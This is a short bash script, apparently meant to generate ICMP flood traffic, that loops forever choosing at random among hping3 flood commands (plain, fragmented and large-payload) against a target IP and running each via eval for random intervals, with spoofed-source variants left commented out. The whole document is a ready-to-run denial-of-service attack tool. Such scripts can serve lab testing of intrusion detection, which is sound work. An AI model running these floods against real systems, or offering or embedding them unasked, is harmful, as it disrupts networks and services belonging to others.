#!/bin/bash
echo "Starting ICMP Attacks on $TARGET_IP..."

ICMP_ATTACKS=(
    "hping3 -1 --flood $TARGET_IP"
    "sudo hping3 -1 --flood --frag -d $((RANDOM % 120 + 5)) $TARGET_IP"
    "hping3 -1 -d $((RANDOM % 5000 + 600)) --flood $TARGET_IP"
    "hping3 -1 -d $((RANDOM % 500 + 100)) --flood $TARGET_IP"  # ICMP payload attack

    # "hping3 -1 -d $((RANDOM % 5000 + 600)) --flood --rand-source  $TARGET_IP"
    # "sudo hping3 -1 --flood --frag -d $((RANDOM % 120 + 5)) --rand-source  $TARGET_IP"
    # "hping3 -S --udp --icmp --flood --rand-source  $TARGET_IP"
    # "hping3 -1 --flood --rand-source  $TARGET_IP"
)

while true; do
    SLEEP_INTERVALS=("$((RANDOM % 11 + 5))" "$((RANDOM % 46 + 15))" "$((RANDOM % 31 + 60))")
    RANDOM_SLEEP=${SLEEP_INTERVALS[$((RANDOM % 3))]}
    RANDOM_INDEX=$((RANDOM % ${#ICMP_ATTACKS[@]}))

    echo "Executing: ${ICMP_ATTACKS[$RANDOM_INDEX]} for $RANDOM_SLEEP seconds..."
    
    eval "${ICMP_ATTACKS[$RANDOM_INDEX]}" &

    sleep $RANDOM_SLEEP
    
    killall hping3

    sleep 8
done



echo "ICMP Attacks Completed!"
